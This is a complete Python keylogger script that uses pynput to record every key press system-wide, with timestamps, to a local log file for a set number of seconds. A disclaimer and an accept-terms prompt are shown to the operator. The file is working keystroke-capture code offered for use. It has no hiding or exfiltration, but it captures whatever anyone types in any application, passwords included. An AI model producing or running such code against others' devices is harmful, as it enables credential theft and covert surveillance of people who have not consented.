import pynput
import time
import os
import sys

# Define the path for the log file
LOG_FILE_PATH = "keylogger_log.txt"


def keylogger(key):
    """
    The keylogger function that handles key press events.
    Logs the time of the event and the key pressed to a log file.
    """
    # Capture the current timestamp
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

    try:
        # Format key as a string
        key_str = str(key).replace("'", "")  # Remove single quotes around the key
    except Exception as e:
        key_str = f"Error: {e}"

    # Handle special keys for better readability
    if "Key" in key_str:
        key_str = key_str.replace("Key.", "[") + "]"

    event = f"{timestamp} - {key_str}\n"

    # Append the event to the log file
    with open(LOG_FILE_PATH, "a") as log_file:
        log_file.write(event)


def display_disclaimer():
    """
    Displays the keylogger disclaimer to the user before accepting terms.
    """
    print("-------------------- Keylogger Disclaimer --------------------")
    print("This program is designed for educational and ethical purposes only.")
    print("Unauthorized use, distribution, or modification is prohibited.")
    print("By using this program, you agree to the following terms and conditions:\n")
    print("1. You will only use this program on systems you have explicit permission to monitor.")
    print("2. You will not use this program to violate any laws, regulations, or terms of service.")
    print("3. You will not use this program to harm, disrupt, or exploit systems or devices.")
    print("4. You will not intercept, collect, or store sensitive information illegally.")
    print("5. Redistribution or sale of this program without the author's consent is prohibited.")
    print("6. The author is not responsible for any damages resulting from using this program.")
    print("7. You will respect the privacy and security of any devices and systems you interact with.")


def get_user_approval():
    """
    Prompts the user to accept the terms and conditions.
    Returns True if the user accepts, False otherwise.
    """
    accept_terms = input("\nDo you accept the terms and conditions? (y/n): ")
    return accept_terms.lower() == 'y'


def main():
    """
    Main function to execute the keylogger program.
    Handles user interaction, logs keystrokes, and manages execution duration.
    """
    # Display the disclaimer and get user acceptance
    display_disclaimer()

    if not get_user_approval():
        print("You must accept the terms and conditions to proceed.")
        sys.exit()

    # Get the duration for logging keystrokes
    try:
        log_duration = int(input("Enter the duration (in seconds) for logging keystrokes: "))
    except ValueError:
        print("Invalid duration. Please enter a valid number of seconds.")
        sys.exit()

    # Start the keylogger listener
    with pynput.keyboard.Listener(on_press=keylogger) as listener:
        print(f"Keylogging for {log_duration} seconds...")
        time.sleep(log_duration)

    # Provide the location of the log file
    print(f"\nKeylogging session complete. The log file has been saved to: {os.path.abspath(LOG_FILE_PATH)}")


if __name__ == "__main__":
    main()